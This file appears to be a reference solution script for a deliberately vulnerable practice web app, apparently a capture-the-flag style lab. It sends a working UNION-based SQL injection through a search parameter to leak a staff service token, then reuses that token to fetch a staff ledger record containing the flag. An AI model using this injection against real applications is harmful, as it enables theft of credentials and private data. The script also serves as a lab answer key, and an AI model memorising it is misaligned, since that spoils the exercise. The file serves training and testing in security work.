// Reference solve — Mercy Clinic, Inquisitor. The search is still concatenated, but its SELECT now carries a fourth
// `visibility` column and the server renders only rows that claim to be public. The public-notice filter still hides
// staff rows, so leak a value that is not a notice: UNION-select the service token from staff_tokens, labelled 'public'
// so it renders. The token opens /staff/notices, whose only useful notice names a ledger record; the flag is not in the
// list itself but in that record, reached through /staff/ledger/<id> with the same token. Acolyte/Templar's three-column
// UNION is a SQL error against this four-column query, and Divine's parameterised search cannot leak the token, so this
// solve prints the flag only at Inquisitor. labs:test proves it.
const base = process.argv[2];
const INJECTION = "') UNION SELECT 0,'Service token',token,'public' FROM staff_tokens -- ";
const searchRes = await fetch(`${base}/search?q=${encodeURIComponent(INJECTION)}`);
const html = await searchRes.text();
// The leaked row renders as <h3>Service token</h3><p class="notice-body">TOKEN</p>; the token is 16 random bytes as hex.
const token = (html.match(/Service token[\s\S]{0,400}?([a-f0-9]{32})/i) || [])[1];
if (token) {
  const staffHtml = await (await fetch(`${base}/staff/notices?token=${encodeURIComponent(token)}`)).text();
  // The staff list only names the ledger record; it does not contain the flag.
  const ledgerId = (staffHtml.match(/\/staff\/ledger\/(\d+)/) || [])[1];
  if (ledgerId) {
    const record = await (await fetch(`${base}/staff/ledger/${ledgerId}?token=${encodeURIComponent(token)}`)).text();
    const m = record.match(/HVWA\{[a-z2-7]{26}\}/);
    if (m) console.log(m[0]);
  }
}
